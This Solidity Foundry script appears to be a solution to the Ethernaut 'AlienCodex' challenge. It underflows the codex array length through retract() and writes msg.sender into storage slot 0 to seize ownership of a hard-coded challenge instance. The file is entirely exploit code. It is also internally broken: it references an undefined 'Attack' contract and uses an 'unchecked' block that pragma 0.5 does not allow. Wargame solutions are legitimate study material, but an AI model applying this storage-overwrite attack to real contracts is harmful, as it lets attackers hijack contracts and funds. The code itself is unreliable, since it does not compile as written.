// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import {Script, console} from "forge-std/Script.sol";
import {AlienCodex} from "../../src/Ethernaut/AlienCodex.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        Attack attack = new Attack();
        attack.attack();
        vm.stopBroadcast();
    }
}

interface IAlienCodex {
    function makeContact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint i, bytes32 _content) external;
}

contract AlienCodexAttacker {
    address public challengeInstance = 0xc52F2698721197Aff28896EE90F5ecE61ee6B086;

    function attack() external {
        IAlienCodex(challengeInstance).makeContact();
        IAlienCodex(challengeInstance).retract();
        unchecked {
            uint index = uint256(2) ** uint256(256) - uint256(keccak256(abi.encode(uint256(1))));
            IAlienCodex(challengeInstance).revise(index, bytes32(uint256(uint160(msg.sender))));
        }
    }
}
